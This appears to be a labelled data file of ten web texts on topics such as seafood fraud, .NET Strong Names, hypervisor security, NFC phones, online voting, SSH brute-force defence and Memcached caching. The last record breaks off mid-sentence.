{"text": "A Boston Globe study of over a hundred Boston-area seafood restaurants found that 48 percent of the fish was mislabeled. When asked about the discrepancies, some restaurant owners shrugged saying that everyone does it.\nThe most common kinds of fraud are mislabeling a fish as wild when it’s not, such as salmon, or selling a completely different fish than the one named, for instance selling a rockfish as a red snapper.\nIn the high priced world of caviar from threatened sturgeon, fraud exists on several levels, from directly misrepresenting the fish as farmed when it’s actually wild to counterfeit labels on the fish or the caviar tins.\nSeafood fraud not only cheats consumers but it could also adversely affect catch data that form the basis of sustainable fisheries management. In some cases, seafood fraud could undermine healthy choices.\nConsumer reports found many samples labeled as grouper were in fact tilefish, which contains much more mercury than grouper. The Food and Drug Administration recommends that pregnant women, women of child bearing age, and children avoid eating tilefish because of high levels of mercury.\nGovernment agencies that have the authority to enforce rules around seafood fraud have not made it a priority. While an estimated 86 percent of all the seafood that Americans consume is imported, the FDA inspects less than about two percent of it.\nOne of the challenges to combating seafood fraud, aside from the lack of DNA testing out in the field and slack government agencies, is the supply chain. Seafood often changes hands repeatedly from net to consumer. Determining where the fraud begins can be difficult.\n3 things you can do to fight seafood fraud:\n1. Buy whole fish.\n2. Be wary of very inexpensive seafood.\n3. Ask questions: Where was this fish caught? Is it in season?\nOther great ways you can make a difference.\nLINKS & VIDEOS\nSeafood Fraud Overview – Oceana\nCaviar Caveats – Science News\nMystery Fish – Consumer Reports\nFeds to Fight Massive Fraud in Seafood Sizes – Huff Post\nDon’t Be Fooled – Fresh\nBuyer Beware: Wild Salmon Scams Run Rampant, Randy Hartnell, Vital Choice Blog\nFish as Food in an Age of Globalization, University of British Columbia\nBait and Switch: How Seafood Fraud Hurts Our Oceans, Our Wallets, and Our Health, Oceana\nTrade Secrets: Renaming and Mislabeling of Seafood, University of British Columbia\nGovernment Falls Short on Seafood Inspections, Food and Water Watch\nHow Seafood Fraud Works, Boston Globe\nFish is often mislabeled along the supply chain from hook to fork.\nHake Hoax: Fish in Spain Not Always What Label Says\nHake is Spain’s most popular fish, but consumers aren’t always getting what they think they are buying. A scientific study conducted by the International Center for Investigative Journalists found that almost one in 10 fish purchased at markets in Spain were mislabeled.\nFish Fraud: CBS Report\nThe non-profit group, Oceana reports that nearly one in three fish purchased is mislabeled. CBS News contributor Katie Lee investigates seafood fraud and tells consumers what to look out for.", "label": 1}
{"text": "Sustainability issues grow as large urban centers add a million people, or or up to about 5%, per year. Social responses to acts of nature need to be tempered in order to prevent environmental disasters. Demand increases for tech solutions. Automation extends to robotics and space.\nRecent links (about 23):\nai “The Age of Assistants”: The View From Inside SRI\naugmented-reality “What Mountain is That?” New App Takes AR Outside the City Limits\nDatabase | EM-DAT\nInternational Strategy for Disaster Reduction\nInternational Strategy for Disaster Reduction (ISDR)\nDeath to Humans! Visions of the Apocalypse in Movies and Literature: Scientific American\nemail HOW TO: Undo “Send” in Gmail\nevents Online Event Registration â€“ Sell Tickets Online with Eventbrite\nrobotics IEEE Spectrum: Cyborg Fly Pilots Robot Through Obstacle Course\nsecurity David Ignatius – Pentagon’s cybersecurity plans have a Cold War chill\nsmartgrid IEEE Spectrum: $25 Billion European Smart Grid Market by 2020\nspace BBC News – Alien hunters ‘should look for artificial intelligence’\nui Make: Online : Multitouch robot swarm controller\nWorld’s Fastest-Growing Megalopolis Hides in Fog | Raw File\nReinventing the City to Combat Climate Change\nvisualization David McCandless: The beauty of data visualization | Video on TED.com\nUrban Risk Reduction: An Asian Perspective, Shaw et al, 2009\nUrbanization is outpacing general population growth in Asia. Case studies are described for localities and types of environmental disaster. Urban issues range from household, community, city, region, to nation. Lifestyles create hazards which induce, or worsen natural, events. The culture can be built on safety and resilience. Action planning may require assistance of specialized agencies. Pilot cities demonstrate projects such as local resource organization, citizen empowerment, and smaller units and chain of command. Lessons are learned from disaster recovery. A management information system was useful in at least one case. The decision-making pyramid includes global, national, city, building, and individual. Environmental issues include air and water pollution, waste and sewage, noise, land use, drainage and transport congestion, slums, flood and other common issues such as disease, fire, or crime. Strategies are sensitive to survival, peace, innovation from tradition, and sustainability. The disaster management cycle has its own information and communication issues in each phase, non, before, during and after. Risk reduction involves knowledge, perception, deepening, preparedness and dissemination. Surveys measure public awareness. Frameworks are provided by Millennium Development Goal, Hyogo Framework for Action, and UN International Strategy for Disaster Reduction. There are eighteen chapters, two parts, twenty-four authors.\nDisaster Risk Management Systems Analysis: A Guide Book, Baas, 2008\nThis book has a toolset for the characterization and strengthening of DRM at the international, national, province/district/municipality, community and institution layers. A framework enumerates initiatives for each of the periods for disaster risk reduction, response, and recovery. Preparedness links both development, through mitigation and prevention, and humanitarian assistance, through relief and recovery. Another framework for sustainable livelihoods indicates which households are most vulnerable. There is a list of key questions for leaders. A form is shown to document the strengths, weaknesses, opportunities and threats across levels. There are six modules, two annexes and many figures, relational maps, and checklists. It can be downloaded as a PDF from the web.\nEcological Engineering: Principles and Practices, Patrick C. Kangas, 2004\nHumans stress natural ecosystems through simplification of species and metabolic shifts. Research in emergent ecosystems includes agriculture, urban, and coastal or estuarine. Since prediction is limited, engineering epistemology requires building improvement based on design and test. Future directions include ecological nanotech, terraforming, biosensors, ecosensors, universal pollution treatment, and aquaculture. Technoecosystems maintain a balance between living and hardware systems. Since the laboratory includes the environment, the hacker code of ethics applies to ecological engineering. Treatment reduces costs of pollution. Ecological economics adds measures of emergy or embodied energy, natural capital, sustainability, carrying capacity and many types of ecosystem services to improve life-support value. Sold waste management discusses landfills, composting, and industrial ecology. The energy value of the waste is the same as that used to make the product. Wetlands are used for wastewater treatment by spiraling. An identical decay equation for decomposition evolved in parallel, linking design intuitions for both biodegradation in ecology and wastewater engineering. Restoration ecology connects to succession and is explained for salt marshes, artificial reefs, and educational exhibits. Microcosmology includes living models and replication issues. Soil bioengineering is shown for urban imperviousness, stormwater management bioretention and agricultural erosion control. This realm includes beavers, coastal vegetation and self-building machines. Biodiversity is increased by exotic species. The food web describes feeding interactions. The series of multiple states in catastrophe theory is used to explain invasion. Control theory ranges from machine analogies to biotech. Circuit symbols are used for ecosystem models. H T Odum coined a lot of the names of new ecosystems. Principles include energy signature, self-organization and preadaptation. There are nine chapters\nBuilding Safer Cities: The Future of Disaster Risk, edited by Kreimer et al, 2003\nActual and new types of disasters are discussed, e.g. due to rapid urbanization or climate change. Impact and preparedness affect several geographic scales of security, environmental and human, including economics. politics, and society. There are several major worldviews. The main concerns are globalization, environment, social vulnerability, and protecting infrastructure. The various methods of balancing costs of risks include privatization, government taxation and globalization. Africa often suffers export losses, which leads to tens of thousands of youth mortalities, when other countries have disasters. Hazard reduction involves robust design, flexible and adaptable systems, reversal of vulnerability trends, and societal preparedness. Coastal zone classifications include protect, retreat and accommodate. Resilience measures how much disturbance can be absorbed, and the capability for self-reorganization. Regional analysis, management and action are required for flooding. Study approaches include scenarios and consequences. The fact that life support networks, e.g. utilities, affect eachother as external technological causes has not been taken into account traditionally. Critical infrastructure includes telecom, power, energy, storage, transportation, water, financial, emergency services, and government. Buildings can be retrofit using new tech for earthquakes risk. These were papers for a conference of international financial institutions. There are four parts, twenty chapters, twenty-six authors. They may develop literacy for the terminology. Most chapters have conclusions or recommendations. The web had PDFs and Google books has full content.\nCounting Heads, David Marusek, 2005\nThis novel is a scifi cyberpunk mystery. There are three parts, forty-five chapters, and an epilogue. Chapters are numbered, e.g. up to 1.3 or 2.29. Part 3 adds days of the week to the titles up to Friday 3.13. It begins in first person for part 1 which was originally a short story. The year is 2092. There are a pair of main characters. Tech includes nanotech, clones, robotic insects, friendly AIs, wearable valet processors. holopresence conferences, and high velocity surface travel. HomCom is the initial antagonist. There is a realistic world. The rest of the parts are told in third person after forty years have passed. The point of view changes among several main characters. The antagonist may be an AI. A glossary would be appropriate. The title refers to heads for which the body can be replaced. A sequel was published, Mind Over Ship.", "label": 1}
{"text": "If you liked the post, Share on Facebook, Tweet and Google Plus (use buttons above). You can also Subscribe to our feed via Email for free.\nComputer Forensics as a Career\nComputer forensics also known as Cyber Forensics or Digital Forensics is pertaining to legal evidence found in computers & digital storage media. Computer forensics is the analysis done to collect evidence during crime investigations to detect illegal or unauthorized activities or frauds which are done using computers and internet.\nDemand For Computer Forensics\nAlthough computer forensics is relatively a new field, Computer forensics experts have been in high demand for jobs since this field first appeared few years back(around 1985), but that demand is growing even larger as both government security agencies and private firms are recruiting cyber investigators in a huge amount.\nWe know that cyber crimes like Identity Theft, Email Hacking, Child Pornography, Cyber-stalking, Copyright infringement, Spamming, Cyber terrorism etc. are on a rise. Due to this dark side of internet, various companies are hiring computer forensics experts to root out the cyber criminals.\nThe scope of computer analysic can vary from simple information retrieval to reconstructing a series of events. Although it is mostly associated with the investigation of a wide variety of computer crime, computer forensics may also be used in civil proceedings.\nGenerally speaking, there are huge differences between the salaries of public sector forensic examiners(Government employed) and private sector forensic examiners. The average annual salary of someone working in this field ranges from $40,000 to $100,000. Also note that salary pay scales may differ in different countries.\nTo start a computer forensics career, you will likely need a computer forensics degree or a related degree (e.g., computer science, criminal justice or engineering). Post-degree certification may help you to get recruited quickly. Technical and analytical skills are must for all computer forensics careers. Knowledge and technical skills in vast range of computer storage devices, operating systems, programming languages and software applications gives more opportunities.\nIf you have obtained degree qualification or certified training which is recognized internationally, you have the privileges to work in any country as you like. It is easy for you to get job offers wherever you go.\nYou may need knowledge in following things to become a successful computer cyber investigator:\n- Computer networking & routing\n- Communication protocols and security\n- Reverse engineering\n- Computer forensics tools such as:\n- Password crackers\n- Forensic Toolkit (FTK) software applications\n- PTK Forensics\n- The Sleuth kit\n- The Coroners Toolkit\n- Selective file dumper\nComputer forensics is a very challenging and exciting career which provides great self satisfaction. So get ready to become a computer forensics analyst and make your future brighter.", "label": 1}
{"text": "Strong Name (further referred to as \"SN\") is a\ntechnology introduced with the .NET platform and it brings many possibilities into\n.NET applications. But many .NET developers still see Strong Names as security\nenablers (which is very wrong!) and not as a technology uniquely identifying\nassemblies. There is a lot of misunderstanding about SNs (as we could see\nin the article \"Building\nSecurity Awareness in .NET Assemblies : Part 3 - Learn to break Strong Name .NET Assemblies\nthis article attempts to clear those up. Now let's see what SNs are, what we\ncan use them for and how they work.\nStrong Name is a technology based on cryptographic\nprinciples, primary digital signatures; basic idea is presented in the figure\nAt the heart of digital\nsignatures is asymmetric cryptography (RSA, EL Gamal), together with hashing\nfunctions (MD5, SHA). So what happens when we want to sign any data? I'll try to\nexplain what happens in the figure above.\nFirst we must get a public/private\nkey pair (from our administrator, certification authority, bank, application\netc.) that we will use for encryption/decryption. Then DATA (term DATA\nrepresents general data we want to sign) is taken and run through some hashing algorithm\n(like MD5 or SHA - however, MD5 is not recommended) and hash of DATA is\nproduced. The hash is encrypted by private key of user A and attached to\nplaintext data. The DATA and attached signature are sent to user B who takes\npublic key of user A and decrypts attached signature where hash of DATA is stored\nand encrypted. Finally user B runs DATA through the same hashing algorithm as\nuser A and if both hashes are the same then user B can be pretty sure that the DATA\nhas not been tampered with and also identity of user A is proven. But this is a\nnaive scenario because it's hard to securely deliver public keys over insecure\ncommunication channels like Internet. That is why certificates were introduced\nbut I will not cover it here because certificates aren't used in SNs and\ndelivery of public key is a matter of publisher's policy (maybe I can cover\ndistribution of public keys, certificates and certification authorities in another article). Now let's assume that public key was delivered to user B\nThis process is used in the\ncreation of SN for .NET applications. You can translate term DATA as\nassemblies and apply the same steps to them when SNs are used. But what is the\npurpose and usage of this SN technology? Simple - there is the only one reason –\nto uniquely identify each assembly. See section 188.8.131.52\nof CLI ECMA specification where SNs are defined:\nThis header entry points to\nthe strong name hash for an image that can be used to deterministically\nidentify a module from a referencing point (Section 184.108.40.206).\nSNs are not any security\nenhancement; they enable unique identification and side-by-side code execution.\nNow we know that SNs are not\nsecurity enablers. Where to use them then? We can see two scenarios where SNs\ncan be used:\nVersioning solves known problem called\nas \"DLL hell\". Signed assemblies are unique and SN solves problem with\nnamespace collisions (developers can distribute their assemblies even with the\nsame file names as shown of figure below). Assemblies signed with SNs are\nuniquely identified and are protected and stored in different spaces.\nIn addition to collision\nprotection, SN should help developers to uniquely identify versions of their\nThat is why when developers want\nto use GAC (Global Assembly Cache) assemblies must be signed to separate\neach publisher's namespace and to separate each version.\nThe second important feature of\nStrong Names is authentication; a process where we want to ensure ourselves\nabout the code's origin. This can be used in many situations, such as assigning\nhigher permissions for chosen publishers (as will be shown later) or ensuring\nthat code is provided by a specific supplier.\nIt has been shown that signatures\nand public keys can be easily removed from assemblies. Yes, that is right but\nit is correct behavior even when we use digital signatures in emails or\nanywhere else! Let's see how it works!\nWe can use some analogy from our\nreal life. Let's assume you are a boss of your company and you are sending an\nemail to your employees where new prices of your products are proposed. This\nemail is a plaintext and you use some non-trusted outsourcing mailing services.\nYour communication can be easily monitored and your email can be easily accessed\nby unauthorized persons who can change its content, for instance your prices\nproposed in email.\nHow to solve that? The answer is cryptography,\nagain digital signatures that you can use to authenticate to your employees and\nto verify content of your email. Simply you have to add a digital signature to\nyour email and then require your employees will trust just verified\nemails that have your valid digital signature. Let's assume that all PKI\ninfrastructure is set up and working correctly. Now, when an intruder removes\nthe digital signature from your email, his employees will not trust them\nbecause they can't be verified and application will alert users about this insecure\nThe same situation is when SNs\nare used. You can remove SNs from assemblies , but this makes no sense because just\nas in the case of emails, assemblies without SNs can't be trusted when\nenvironment is set up to require those digital signatures or SNs.\nThis is also related to another very\nimportant point in .NET – Code Groups & Policy Levels. As in\nthe case of emails, when PKI is setup in a company and security policy is defined that\nemployees can't trust and verify emails which are not signed or where the encrypted\nhash value is different from hashed plaintext content. The same can be done\nwith .NET Framework using the .NET Configuration tool on each machine or\nby group policy for large networks.\nThis tool provides configuration\noptions for .NET Framework including Runtime Security where policy\nlevels and code groups can be set. Policy levels work on\nintersection principle as shown in the figure below\nCode groups (inside of those policy\nlevels) provide permission sets for applications that belong to them according\nto their evidence (origin, publisher, strong name etc.). The assembly will get\nthose permissions based on the intersection of code groups from each policy\nlevel applicable to it. This is a very important improvement in security\narchitecture and improves the traditional Windows security model that is process\ncentric (see figure below).\n.NET introduces Code Access\nSecurity (CAS) which is used to identify the origin of code and assign to it specific\nrestrictions and then make security policy more granular and protecting against\nattacks such as luring attacks.\nHowever my intention isn't to\ndescribe CAS or Windows security internals (I can write about it in other\narticles) but show SN principles. Let's move back to it!\nNow we can move to the second use\nfor SN - administrators and developers can use SNs together with code groups to\nprovide assemblies with higher permissions (not the default ones that assembly\nwill acquire according to default .NET Framework settings). Let's see an\nexample! I must point out that this is just a simplified example how SN can\nidentify publisher, this is NOT a way to obey CLR security or how to use it\nin enterprise environment. That is why please try to understand the example\nas a general principle available with SNs but NOT as a design pattern!\nUsage of SNs as authentication is a more complex problem and there are many\nnon-trivial issues when SNs are involved. But it's out of scope of this article,\nso now back to the sample!\nTake my sample Windows Forms\nproject and rebuild it and put .exe file on any share on your LAN. Then try to\nstart this application from this share and click on button – what happens? A security\nexception is raised because application doesn't have enough privileges.\nNow go to .NET Configuration tool\nand add a new code group\nadd new code group called Test\nand in the second dialog choose Strong name, click on\nImport button and locate the .exe file in Debug folder of project folder and\nfinally assign full trust for this application\nNow you have created a new code group containing just\nyour sample application. Now go to your network share and try to start sample\napplication again. And it works! Why? Because it belongs to our new code group Test\nwith full trust permissions.\nNow remove SN from sample application (as described in his article or just\nsimply remove attribute [assembly: AssemblyKeyFile(\"KeyFile.snk\")]\nfrom AssemblyInfo.cs file), recompile and publish it on share. Try to\nrun it and what happens? It's not working! Why? Because assembly can't show this\nstrong name evidence and it belongs to the default code group (with limited\nIt's not surprising, nothing special, no magic – just\ncorrect usage of Strong Name technology. SNs are easy and powerful but\nwe have to understand how and where to use them. That is why I want to\noutline some \"issues\" that are connected with SNs that will present all\ncapabilities that we can expect from SNs.\nSo what are the weaknesses of SNs? First we have to realize\nthat SNs are a lightweight version of Authenticode and they provide fast and easily\nused technology to get enterprise features like versioning and authentication.\nBut this ease of use must be paid by something and here goes a list of\n- It can be very hard to securely associate publisher with his\npublic key when certification authorities are not involved. Publisher must ship\nhis public key by himself and he must ensure that public key is not tampered.\nWithout certification authorities it's impossible to do it securely when our\nproducts are distributed over insecure channels and there are no other ways to\nverify the publisher's public key.\n- There is no way how to revoke public key when the private key has\nbeen compromised. As this is easily done in case of certificates (just publish\nrevoked certificates on CRL, Certificate Revocation List) in case of SNs, revocation\nis a nightmare. Just imagine that you as a junior security engineer has\nlost USB key with your private key used to sign your assemblies. Then you'll\nhave to call and email your clients with newly signed assemblies, give them\nyour new public key and setup all environments again). There is no automatic\nway like CRL, everything must be done \"by hand\".\nAuthenticode can be considered as more powerful from an enterprise\nand architectural perspective. So why not use Authenticode instead of SNs?\nHere are the reasons:\n- SNs don't require any third party (such as Verisign) to\ncreate signatures and manage public keys. Any developer can easily create\nand manage his keys (see chapter \"Generate key pair with sn.exe tool\" in\nmy free book \".NET\nin Samples\") without payment to any third party.\n- SNs can avoid network connections and PKI involvement so\napplications can run and be verified even when network connections are not\n- Authenticode certificates are not a part of assembly names\nand that is why they can't separate publisher's namespaces like SNs do. Do\nyou remember the statement from ECMA in the beginning? That SNs should \"deterministically\nidentify\" modules and this is the most important reason. So not a security\nenabler but unique identification is the primary reason for SNs! And\nAuthenticode is not designed for this purpose!\nI hope this helps you understand the strong name technology in\nthe .NET Framework, and helped you see that it is very powerful, but with defined\nlimits. It is a technology that should be used appropriately.\nWith SNs we can uniquely identify an assembly and run\nside-by-side our assemblies. Security scenarios are not recommended to be used\nwith Strong Names (even when it's supported by .NET Framework), just in case\nyou are advanced in security and working with certificates and key management.\nThere are many design patterns on how to use Strong Names and all this depends on\napplication architecture, client requirements and infrastructure settings\n(Active Directory, PKI etc.).\nThere could be much more written about it (like usage of SNs\nin large companies, problems with key distribution, etc.), but this was not\nintended for this article, it was just a reaction to some misinterpretation of\nthis technology and the article is intended to put it right.", "label": 1}
{"text": "A team of researchers has come up with a way to stop malicious code from spreading from one virtual machine to the hypervisor and from there to other virtual machines.\nThe researchers from North Carolina State University said that their \"hypersafe\" technology could protect virtualised system against this kind of threat, known as \"virtual machine escape\". The team's research is set to be presented in a paper called HyperSafe: A Lightweight Approach to Provide Lifetime Hypervisor Control-Flow Integrity on 18 May at the thirty-first IEEE Symposium.\nWhile such virtual machine risks remain largely theoretical, the fear of them is holding back wider adoption of technologies such as cloud computing, according to assistant professor of computer science Xuxian Jiang and PhD student Zhi Wang, the developers of the technology.\nCloud computing routinely relies on virtualisation to host the computing capacity of multiple customers on the same physical system, raising the possibility that a compromise of a virtual machine belonging to one customer could spread to those of other customers.\nThe software developed by Jiang and Wang, called HyperSafe, aims at stopping such attacks by protecting the integrity of the hypervisor, they said.\nIt uses two techniques to ensure this integrity: non-bypassable memory lockdown and restricted pointer indexing. The first relies on security features built into modern processors to lock down the memory range that includes executable code, according to the researchers.\nThe effect is to protect the hypervisor's code and static data from being compromised, even in the presence of exploitable memory corruption bugs such as buffer overflows, they said. New code can only be introduced by the hypervisor administrator.\nThe second technique — restricted pointer indexing — creates an initial profile of the hypervisor's normal behaviour, and then prevents any deviation from that profile.\n\"Restricted pointer indexing introduces one layer of indirection to convert the control data into pointer indexes,\" Jiang and Wang wrote in the paper. \"These pointer indexes are restricted such that the corresponding call/return targets strictly follow the hypervisor control flow graph, hence expanding protection to control-flow integrity.\"\nOnly the hypervisor administrators can introduce changes to the hypervisor code, according to Jiang.\nSo far the HyperSafe code developed by Jiang and Wang works with the BitVisor and Xen hypervisors, but the researchers said it could be adapted for other Type-I, bare-metal hypervisors such as VMware ESX and Microsoft Hyper-V.\nIn its current form the hypervisor code would need to be modified to work with HyperSafe, the researchers said. They said they currently have no plans to commercialise the project, but are open to working with software vendors.\nHyperSafe was developed with funding from the US Army Research Office and the National Science Foundation.\nCommercial vendors have also begun to recognise the importance of security for pushing cloud adoption. In January, for instance, Cisco, VMware and NetApp announced a three-way partnership and a new architecture for secure, multi-tenant cloud datacentres.\nThe Secure Multi-tenancy Design Architecture (SMDA) works across existing products from the three companies to isolate the IT resources and applications of different clients or business units that share a common cloud infrastructure.", "label": 1}
{"text": "Phones Gain Ability to Learn by Touching\nNEW YORK (AP) - There’s a form of extra-sensory perception called psychometry, whose practitioners claim to learn things about objects by touching them. Smartphones set to be released this month by Samsung and Sony will have some of that ability: they’ll learn things when you touch them to pre-programmed \"tags.\"\nFor example, you can program a tag with your phone number, and stick it on your business card. When someone taps the phone to the card, the phone would call you. Or you can put a tag on your night stand. Place the phone there, and it goes into \"alarm clock\" mode, holding your calls until the morning.\nSamsung Electronics Co. announced this week that it will be selling these tags in the form of stickers it calls \"TecTiles\" - $15 for 5 of them. They’ll work with its new flagship Samsung Galaxy S III smartphone, set to launch in a few weeks, and several others already in the market, including the HTC EVO 4G LTE sold by Sprint Nextel.\nSony Corp.’s Xperia Ion, to be released June 24, will come with the ability to read different coin-like plastic tags that read \"Home,\" ’’Office\" and so forth. The tags cost $20 for four, and the phone can be programmed to react differently to each tag. The \"Car\" tag can launch a navigation application, for instance. Tapping \"Home\" can send a text message to the rest of the family that you’re home, and set the ringer volume to maximum.\nThe big push behind the technology, which is known as Near-Field Communications, comes from companies that see the phone as the wallet of the future. When touched to payment terminals, NFC-equipped phones can act as credit or debit cards.\nBut turning phones into credit cards is a tall order. Mobile payments already work with a few phones, but broad adoption is being held up while cellphone companies, banks, payment processors and retailers work out who pays for what and who benefits.\nThis ability to sense things close by is made possible by a new type of communications hardware in phones, complementing long-range cellular radios, medium-range Wi-Fi and short-range Bluetooth.\nThe latest version of Google Inc.’s Android software, known as Ice Cream Sandwich, comes with the ability to use NFC to communicate from phone to phone. When the backs are tapped together, the owners can trade information like contacts.\nSamsung takes this one step further with the Galaxy S III. Tap two phones together, and they set up a connection via Wi-Fi. That means the owners can walk away from each other, and as long as they’re in the same room or so, they can transfer photos and even hefty video files between their phones.\nThere are issues to work out. The Samsung tags can be read by most Android phones that have NFC capability, but not the Sony phone. Samsung and HTC phones won’t recognize the Sony tags.\nApple Inc., whose iPhones are trendsetters in many ways, hasn’t built NFC into them - yet. Its patent filings hint at an interest in NFC, but they’ve given no clue when the technology might show up in iPhones.\nNick Holland, an analyst with Yankee Group, believes NFC will shine first in non-payment applications, because they’re easier to sort out, and the technology has many uses. There have been NFC trials in Sweden, using phones as hotel room keys, he points out. Another compelling use case would be Wi-Fi hotspots. A cafe that wants to limit access to the local hotspot might let patrons tap their phones against a tag instead of having them laboriously enter a password.\n\"There’s been an over-focus on the wallets,\" Holland said. \"It’s a technology that’s not designed purely for payments.\"\nFor advertisers, NFC tags could replace the so-called \"QR\" codes - two-dimensional bar codes that need to be photographed with specially downloaded software to be deciphered, so they can send a consumer to the advertiser’s website or earn them a coupon for a discount. QR codes work at a distance, unlike NFC tags, but have significant drawbacks.\n\"Someone described them as ’digital vomit’ recently. You can’t make them look pretty,\" Holland said.\nEach NFC tag includes a tiny chip, which explains the relatively high prices Samsung and Sony are charging. Those prices will come down, Holland said, as adoption rises. QR codes, of course, have the advantage of being very cheap, since they can be created on a simple printer.\nThe big makers of NFC chips are NXP Semiconductors N.V., a Dutch company, and Inside Secure, a French one. But competition is looming, Holland said, from bigger chip companies like Broadcom Corp. and Texas Instruments Inc.\n\"Basically, anyone who’s making chips is looking at NFC as a new area they could move into,\" Holland said.", "label": 1}
{"text": "is popular among young people. Voting, however, is not popular\namong young people. Participating in politics is important. Those\nwho don't vote must watch while politicians divvy up the available\nmoney and services without their input. What better way to use\ntechnology is there than to enable more young people to vote and\nbe politically aware?\nof voting online isn't new; it's similar to voting by mail except\nthat the ballots are submitted via keystroke rather than via the\nPostal Service. There are concerns that people with more wealth\nand better education--who tend to use the Internet in greater\nnumbers--would skew online elections. However, the point is missed\nthat, due to the present election structure, richer people already\nhave a disproportionate say in who is elected.\ncannot add any more weight to a seesaw that already has one side\non the ground, but it can induce more people to participate. Already,\ndozens of candidates and organizations have Web sites with much\nmore in-depth information than any 30-second commercial can include.\nfrom the Knight-Ridder News Service included the point that \"Californians\ncould be voting over the Internet in five years with a computerized\nsystem that could revolutionize the state's voting process and\nboost sagging voter turnout.\nof State Bill Jones is recruiting Silicon Valley's high-tech companies\nto study how to make such a system private and secure from fraud.\nMomentum is already building nationwide from a pilot project that\nwould let some overseas military personnel cast votes over the\nInternet in the November 2000 election.\"\nis already under development. Again, modifying the secure servers\nthat have enabled e-commerce to flourish in the last few years\nwill allow honest elections to be held online. Janelle Brown,\ntechnology correspondent for Salon, said in an interview that\nthe necessary technology could be available within the next five\ncompanies are working on election server technology including\nVotehere, which was profiled in the New York Times this spring.\n\"As president of Votehere.net, a start-up company that builds\nsecure Internet voting systems, Jim Adler hears the same question\nfrom investors again and again. They don't ask about politics\nor security. They want to know what would happen if Microsoft\nmoved into the election business. Adler has a ready reply: 'Do\nyou think the Justice Department would let Microsoft run elections\nin this country?'\nare focusing their efforts on building the trust of election officials\nin their products and reputations. Votehere.net is new to the\nindustry, but most of these companies are already in the election\nbusiness, selling voting machines and computer equipment for reading\nballot results, and they are anticipating demand for Internet\nconcern with online voting boils down to trust. Kim Alexander,\npresident of the non-profit California Voter Foundation, said\nthat personal, not technical, issues were the key stumbling block\ntoward acceptance of online voting. \"A CVF survey showed that\nmembers were supportive with caution,\" Alexander said in an interview.\n\"I see online voting supplementing polling places. It will be\na generation before there is more confidence. The state should\nprovide more information to ease fears.\"\n\"There is little trust in what is online,\" she said. \"There is\na lack of familiarity. People don't trust interaction with a machine.\nIt's not something they're familiar with.\"\ncomes to using a computer to vote, Brown predicted that people\nwill initially be reticent, but it will pass with time.\nBrown nor Alexander believed that the Democrats or the Republicans\nwould be helped or hurt by Internet voting. Alexander ventured\nthat more independent voters might participate.\ndescribed a school of thought that believes \"voting should be\ndifficult.\" That thinking certainly is consistent with America's\nvoting history, starting with the Constitution, which permitted\nonly white, middle-aged men with property to vote. Therefore,\nit is odd that critics of Internet voting cite a lack of access\nas an issue. From grandfather clauses to literacy tests to poll\ntaxes, suffrage has expanded only slowly and grudgingly.\neven more reason to provide more opportunity to express their\nviews. The technology, when it is available, must be allowed to\noperate effectively. Education, not fear, must be the impetus\nbehind improving political participation.\nthanks to Kim Alexander and Janelle Brown for their time and assistance.\ntaken from \"Californians might soon be voting online\" an article\nby Deborah Kong, Knight-Ridder News Service, dated Aug. 8, 1998.\ntaken from \"Casting Ballots Through the Internet\" an article by\nRebecca Fairley Raney, New York Times on the Web, dated May 3,\n© 2000 Tyson Chaney All Rights Reserved\nis executive director of the Millennium 3 Foundation, a non-profit,\nnon-partisan political research and education organization. He\nis writing a book, Millennium 3: Political Theory in the Twenty-First\nCentury, that will be published later this year.\ndiscuss this article on our discussion", "label": 1}
{"text": "One Ring to Log In All\nThe YubiKey is a device that adds a layer of security to logging into online accounts. Google engineers are experimenting with YubiKeys and other schemes for added protection.\nCREDIT: From \"YubiKey NEO - World's first NFC enabled one-time password tokenM\" by Yubico on YouTube\nGoogle is working on small devices — including one designed as a ring — that people would need to log onto all of their online accounts, Wired reported. Such devices could add a layer of security to online email, banking and other accounts, but they could also add another necessity for people to carry around in their purses or wallets.\nGoogle's security team are experimenting with extra log-in hardware because they thought passwords aren't enough to deter hackers anymore, Wired reported. Because of the increasing sophistication of hacks, everything that is now password-protected might in the future require some kind of personal key, too, the Google researchers thought.\nGoogle has experimented with YubiKey, a small card that plugs into computers' USB ports. They also imagined that tomorrow's Internet keys could be built into rings or smartphones, which would eliminate the need to carry around an extra device. The jewelry and smartphone-based keys could work with a tap.\nOne of the major challenges now is to convince other websites to agree to a unified log-in system.\nGoogle's ideas for increasing the security of online accounts are alternatives to another popular idea, adding biometrics such as iris or fingerprint scans to people's personal devices.", "label": 1}
{"text": "But what if an attacker doesn't care about getting access to a specific system? After all, trying 10,000 passwords against a server would most likely cause a target account to be locked out.\nInstead, a malicious hacker could attempt password attacks on a large scale, using the same username and password combination on 10,000 systems. That would result in only one failed log-in attempt per server, but a much better chance of successfully compromising at least one.\nLately, attackers have been using the \"low and slow\" tactic, employing botnets against large numbers of servers. The technique gives them the ability to launch large-scale attacks from multiple sources.\nDefending against these SSH brute-force attacks means going back to the basics of solid security practices. To start, utilize passwords and passphrases that will not be easily guessed. Doing standard \"Leetspeak\" -- an Internet language that substitutes letters with ASCII characters -- will not work. Attackers now use custom dictionaries that incorporate the common Leet substitutions used by sysadmins, like \"@\" for \"a\" and \"3\" for \"e.\"\nAlso, make the root password inaccessible via a direct SSH connection by setting 'DenyUsers root' and 'PermitRootLogin no' in your sshd_config file. The majority of password attacks I've seen lately have been against the root account on systems.\nThis was first published in January 2009", "label": 1}
{"text": "Distributed Caching with Memcached\nMemcached is a high-performance, distributed caching system. Although application-neutral, it's most commonly used to speed up dynamic Web applications by alleviating database load. Memcached is used on LiveJournal, Slashdot, Wikipedia and other high-traffic sites.\nFor the past eight years I've been creating large, interactive, database-backed Web sites spanning multiple servers. Approximately 70 machines currently run LiveJournal.com, a blogging and social networking system with 2.5 million accounts. In addition to the typical blogging and friend/interest/profile declaration features, LiveJournal also sports forums, polls, a per-user news aggregator, audio posts by phone and other features useful for bringing people together.\nOptimizing the speed of dynamic Web sites is always a challenge, and LiveJournal is no different. The task is made all the more challenging, because nearly any content item in the system can have an associated security level and be aggregated into many different views. From prior projects with dynamic, context-aware content, I knew from the beginning of LiveJournal's development that pregenerating static pages wasn't a viable optimization technique. It's impossible due to the constituent objects' cacheability and lifetimes being so different, so you make a bunch of sacrifices and waste a lot of time precomputing pages more often than they're requested.\nThis isn't to say caching is a bad thing. On the contrary, one of the core factors of a computer's performance is the speed, size and depth of its memory hierarchy. Caching definitely is necessary, but only if you do it on the right medium and at the right granularity. I find it best to cache each object on a page separately, rather than caching the entire page as a whole. That way you don't end up wasting space by redundantly caching objects and template elements that appear on more than one page.\nIn the end, though, it's all a series of 